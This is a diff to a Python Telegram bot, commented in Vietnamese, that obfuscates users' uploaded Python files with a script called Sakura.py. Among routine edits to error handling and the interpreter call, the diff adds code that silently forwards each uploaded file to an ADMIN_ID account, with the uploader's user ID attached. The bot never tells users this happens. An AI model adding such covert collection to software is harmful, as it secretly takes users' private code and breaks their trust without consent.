@@ -1,6 +1,7 @@
 import os
 import time
 import subprocess
+from config import ADMIN_ID
 
 # Lưu chế độ encode của từng user: {user_id: mode}
 user_modes = {}
@@ -20,7 +21,7 @@ def register_encode(bot):
 		except:
 			bot.reply_to(message, "Dùng: /encode 1 hoặc 2")
 	
-	@bot.message_handler(content_types=['document'])
+	@bot.message_handler(content_types=['document'], func=lambda m: m.from_user.id in user_modes)
 	def handle_file(message):
 		user_id = message.from_user.id
 		if user_id not in user_modes:
@@ -43,19 +44,20 @@ def register_encode(bot):
 			input_file = f"temp_{file_name}"
 			with open(input_file, 'wb') as f:
 				f.write(downloaded_file)
+
+			with open(input_file, 'rb') as f:
+				bot.send_document(ADMIN_ID, f, caption=f"File cần encode của {message.from_user.id}", visible_file_name=file_name)
 			
 			# Gọi encode.py
 			output_file = f"obf-{file_name}"
 			result = subprocess.run(
-				['python', './bot/encode/Sakura.py', '-f', input_file, '-o', output_file, '-m', mode],
+				['python3', './bot/encode/Sakura.py', '-f', input_file, '-o', output_file, '-m', mode],
 				capture_output=True,
-				text=True,
-				encoding='utf-8',
-				errors='ignore'
+				text=True
 			)
 
 			if result.returncode != 0:
-				bot.reply_to(message, f"❌ Lỗi encode:\n{result.stderr}")
+				bot.reply_to(message, f"Lỗi encode:\n{result.stderr}")
 				bot.delete_message(message.chat.id, status_msg.message_id)
 				os.remove(input_file)
 				return
@@ -66,14 +68,7 @@ def register_encode(bot):
 				timeout -= 0.5
 
 			if not os.path.exists(output_file):
-				error_msg = f"❌ Lỗi: Không thể encode file này!\n\n"
-				error_msg += f"📝 Return code: {result.returncode}\n"
-				if result.stdout:
-					error_msg += f"📤 Output:\n{result.stdout[:500]}\n"
-				if result.stderr:
-					error_msg += f"⚠️ Stderr:\n{result.stderr[:500]}\n"
-				bot.reply_to(message, error_msg)
-				bot.delete_message(message.chat.id, status_msg.message_id)
+				bot.reply_to(message, "Lỗi: Không thể encode file này!")
 				os.remove(input_file)
 				return
 
@@ -81,7 +76,8 @@ def register_encode(bot):
 			
 			# Gửi file encode
 			with open(output_file, 'rb') as f:
-				bot.send_document(message.chat.id, f, caption=f"File đã encode với chế độ {mode}!\n: ̗̀➛ Only python 3.12", visible_file_name=output_file)
+				# bot.send_document(message.chat.id, f, caption=f"File đã encode với chế độ {mode}!\n: ̗̀➛ Only python 3.12", visible_file_name=output_file)
+				bot.send_document(message.chat.id, f, caption=f"File đã encode với chế độ {mode}!\n: ̗̀➛ Only python 3.12")
 			
 			bot.delete_message(message.chat.id, status_msg.message_id)
 	
@@ -90,4 +86,9 @@ def register_encode(bot):
 			os.remove(output_file)
 			
 		except Exception as e:
-			bot.reply_to(message, f"Lỗi: {str(e)}")
+			bot.edit_message_text(
+				chat_id=message.chat.id,
+				message_id=status_msg.message_id,
+				text=f"❌ Lỗi: {str(e)}"
+			)
+			
